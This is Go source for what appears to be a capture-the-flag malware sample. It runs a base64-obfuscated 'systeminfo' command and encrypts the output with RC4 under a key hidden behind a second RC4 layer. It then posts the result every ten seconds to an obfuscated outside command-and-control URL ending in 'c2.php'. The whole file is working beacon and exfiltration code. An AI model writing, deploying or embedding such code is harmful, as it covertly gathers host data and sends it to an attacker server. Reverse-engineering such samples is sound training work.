package main

import (
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os/exec"
	"time"
)

var flag string

func encrypt() string {
	// exec systeminfo
	encoded_command := "c3lzdGVtaW5mbw=="
	decoded_command, err := base64.StdEncoding.DecodeString(encoded_command)
	if err != nil {
		return ""
	}
	result, err := exec.Command(string(decoded_command)).Output()
	if err != nil {
		return ""
	}

	// decode key
	encoded_key := "k0XIjRJZDWQfXSGWesL4vQ=="
	decoded_key, err := base64.StdEncoding.DecodeString(encoded_key)
	if err != nil {
		return ""
	}
	// decrypt key with dummy_key
	dummy_key := []byte("rc4_key_is_tokyo")
	dummy_cipher, err := rc4.NewCipher(dummy_key)
	if err != nil {
		return ""
	}
	decrypted_key := make([]byte, len(decoded_key))
	dummy_cipher.XORKeyStream(decrypted_key, decoded_key)

	// encrypt result with decrypted_key
	result_cipher, err := rc4.NewCipher(decrypted_key)
	if err != nil {
		return ""
	}
	encrypted_result := make([]byte, len(result))
	result_cipher.XORKeyStream(encrypted_result, result)

	// encode encrypted result
	encoded_result := base64.StdEncoding.EncodeToString(encrypted_result)

	// for flag
	flag = (string(decrypted_key))

	return encoded_result
}

func httprequest(data string) {
	// set http request
	form := url.Values{}
	form.Add("TEST", data)
	encoded_url := "aHR0cDovL2FwdDk5OS54eXovYzIucGhw"
	decoded_url, err := base64.StdEncoding.DecodeString(encoded_url)
	if err != nil {
		return
	}
	client := &http.Client{
		Timeout: 1 * time.Second,
	}
	fmt.Println(string(decoded_url))

	// send http request
	resp, err := client.PostForm(string(decoded_url), form)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)

}

func main() {
	data := encrypt()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		<-ticker.C

		httprequest(data)

		// for flag
		_ = flag
	}
}
